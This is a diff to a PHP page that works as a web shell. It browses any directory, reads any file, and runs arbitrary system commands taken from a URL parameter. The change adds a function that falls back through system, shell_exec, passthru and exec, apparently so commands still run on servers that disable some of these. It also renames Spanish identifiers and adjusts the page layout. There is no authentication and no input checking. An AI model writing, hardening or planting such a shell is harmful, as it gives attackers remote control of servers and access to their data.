@@ -2,6 +2,7 @@
 $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
 $files = scandir($dir);
 
+// Show file content
 function showContent($file) {
     if (is_file($file)) {
         return file_get_contents($file);
@@ -12,8 +13,22 @@ function showContent($file) {
 
 if (isset($_GET['file'])) {
     $file = $_GET['file'];
-    $contenido = showContent($file);
+    $content = showContent($file);
 }
+
+function execCMD( $cmd ){
+  if(function_exists('system')){
+    system($_GET['cmd']);
+  }else if(function_exists('shell_exec')){
+    shell_exec($_GET['cmd']);
+  }else if(function_exists('passthru')){
+    passthru($_GET['cmd']);
+  }else if(function_exists('exec')){
+    exec($_GET['cmd']);
+  }
+}
+
+
 ?>
 
 <!DOCTYPE html>
@@ -86,7 +101,7 @@ h1 {
     <pre>
     <?php
       if(isset($_GET['cmd'])){
-        system($_GET['cmd']);
+        execCMD($_GET['cmd']);
       }
     ?>
     </pre>
@@ -102,11 +117,11 @@ h1 {
             }
             ?>
         </div>
-        <?php if (isset($contenido)): ?>
+        <?php if (isset($content)): ?>
             <div class="file-content">
-                <h2>Contenido de <?php echo basename($file); ?></h2>
+                <h2><?php echo basename($file); ?></h2>
                 <p><a href="?dir=<?php echo urlencode(dirname($file)); ?>">Back</a></p>
-                <pre style="overflow:auto;"><?php echo htmlspecialchars($contenido); ?></pre>
+                <pre style="overflow:auto;"><?php echo htmlspecialchars($content); ?></pre>
                 <p><a href="?dir=<?php echo urlencode(dirname($file)); ?>">Back</a></p>
             </div>
         <?php else: ?>
@@ -119,7 +134,12 @@ h1 {
                     <?php if ($dir != '.'): ?>
                         <tr>
                             <td><a href="?dir=<?php echo dirname($dir); ?>">../</a></td>
-                            <td>Directory</td>
+                            <td style="text-align:center">Directory</td>
+                        </tr>
+                    <?php else: ?>
+                      <tr>
+                            <td><a href="?dir=./">./</a></td>
+                            <td>&nbsp;</td>
                         </tr>
                     <?php endif; ?>
                     <?php foreach ($files as $file): ?>
